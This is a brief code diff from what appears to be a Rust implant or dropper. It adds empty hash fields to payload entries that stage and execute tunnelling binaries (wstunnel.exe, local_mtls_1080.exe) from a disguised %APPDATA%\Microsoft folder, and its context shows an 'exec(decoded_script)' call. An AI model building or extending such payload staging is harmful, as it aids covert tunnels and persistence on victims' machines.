@@ -191,6 +191,7 @@ exec(decoded_script)
                 sleep: 0,
             }),
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
+            hash:"".to_string(),
         }),
         Payload::Exec(Exec {
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
@@ -203,7 +204,9 @@ exec(decoded_script)
                 dataoperation: vec![],        
             jitt:0,
             sleep:0        }),
-            path: "${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe".to_string() }),
+            path: "${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe".to_string(),
+            hash:"".to_string(),
+         }),
 
         /* 
         Payload::Exec(Exec {
